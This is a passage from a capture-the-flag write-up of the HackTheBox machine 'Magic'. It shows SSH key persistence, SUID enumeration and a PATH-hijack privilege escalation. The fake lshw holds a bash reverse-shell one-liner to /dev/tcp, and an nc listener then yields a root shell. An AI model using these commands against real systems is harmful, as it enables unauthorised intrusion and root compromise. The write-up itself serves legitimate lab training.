</span></span></code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new SSH key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «magic» «10.10.14.169»
</span></span><span class=line><span class=cl>$ ssh-keygen -f theseus 
</span></span></code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <strong>theseus</strong>&rsquo;s <code>authorized_keys</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:~/.ssh$ <span class=nb>echo</span> <span class=s1>&#39;ssh-rsa AAABBBCCCDDD&#39;</span> &gt;&gt; authorized_keys
</span></span></code></pre></div><p>Now I can log in via SSH.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «magic» «10.10.14.169»
</span></span><span class=line><span class=cl>$ ssh -i  theseus@10.10.10.185
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>theseus@ubuntu:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>theseus<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>theseus<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>100<span class=o>(</span>users<span class=o>)</span>,1000<span class=o>(</span>theseus<span class=o>)</span>
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem to be a common SUID on Ubuntu called <code>sysinfo</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:~$ find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
</span></span></code></pre></div><img src=imgs/image-20210413153352652.png alt=image-20210413153352652 style=zoom:67%><p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and <code>theseus</code> is a member of that group.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:~$ ls -las /bin <span class=p>|</span> grep sysinfo
</span></span><span class=line><span class=cl> <span class=m>24</span> -rwsr-x--- <span class=m>1</span> root users <span class=m>22040</span> Oct <span class=m>21</span> <span class=m>2019</span> sysinfo
</span></span></code></pre></div><p>When I execute the binary and it returns some hardware information on the screen that looks similar to what <code>lshw</code>, <code>free</code> and other binary related to hardware info produces.</p><img src=imgs/image-20210413153311827.png alt=image-20210413153311827 style=zoom:80%><p>A quick search on Google shows:</p><img src=imgs/image-20210413153328164.png alt=image-20210413153328164 style=zoom:80%><p>So it is the same header.</p><p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p><ul><li>Absolute path: <code>/bin/sysinfo</code> &ndash;> fixed path, can not be modified except global write access is permitted. (cmiiw)</li><li>Relative path: <code>sysinfo</code> &ndash;> resolved by user&rsquo;s environment, the path follows user&rsquo;s <code>$PWD</code>.</li></ul><h4 id=path-hijack-on-suid>Path Hijack on SUID<a class=anchor aria-hidden=true href=#path-hijack-on-suid>#</a></h4><p>Knowing the SUID binary uses relative path to call other binaries, I can abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p><p>First thing to do is, I will create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and append one liner bash reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:/tmp$ mkdir iamf
</span></span><span class=line><span class=cl>theseus@ubuntu:/tmp$ which lshw
</span></span><span class=line><span class=cl>/bin/lshw
</span></span></code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to the environment variable <code>$PATH</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:/tmp$ <span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
</span></span><span class=line><span class=cl>theseus@ubuntu:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp/iamf:<span class=nv>$PATH</span>
</span></span></code></pre></div><p>Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:/tmp$ which lshw
</span></span><span class=line><span class=cl>/tmp/iamf/lshw
</span></span></code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary. However, it then just hangs.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>theseus@ubuntu:/tmp$ <span class=nv>sysinfo</span>
</span></span><span class=line><span class=cl><span class=o>====================</span>Hardware <span class=nv>Info</span><span class=o>====================</span>
</span></span></code></pre></div><p>That is because its execution is interrupted by the reverse shell. I&rsquo;m rooted now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «magic» «10.10.14.169»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>1234</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>1234</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.169<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.185<span class=o>]</span> <span class=m>36094</span>
</span></span><span class=line><span class=cl>root@ubuntu:/tmp/iamf# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,100<span class=o>(</span>users<span class=o>)</span>,1000<span class=o>(</span>theseus<span class=o>)</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210413152136238.png alt=image-20210413152136238></div></p><div class=post-references><h2>References</h2><ul><li><a href=https://portswigger.net/support/using-sql-injection-to-bypass-authentication target=_blank rel="noopener noreferrer">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></li><li><a href=https://github.com/xapax/security/blob/master/bypass_image_upload.md target=_blank rel="noopener noreferrer">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></li><li><a href=https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ target=_blank rel="noopener noreferrer">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li></ul></div></div></div><div class=post-meta-bottom><span class=post-origin>Originally published at&nbsp;<a href=https://fahmifj.medium.com/hack-the-box-magic-10-10-10-185-scratch-f534fce85b66 target=_blank rel="noopener noreferrer">fahmifj.medium.com</a></span></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/sql-injection/>SQL-injection</a></li><li><a href=https://fahmifj.github.io/tags/exiftool/>Exiftool</a></li><li><a href=https://fahmifj.github.io/tags/upload-bypass/>Upload-bypass</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/suid/>SUID</a></li><li><a href=https://fahmifj.github.io/tags/path-hijack/>Path-hijack</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Magic on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Magic&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f&hashtags=Linux%2cSQL-injection%2cExiftool%2cUpload-bypass%2cWebshell%2cSUID%2cPath-hijack"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Magic on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f&title=HackTheBox%20-%20Magic&summary=HackTheBox%20-%20Magic&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Magic on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f&title=HackTheBox%20-%20Magic"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Magic on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Magic on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Magic%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Magic on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Magic&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fmagic%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>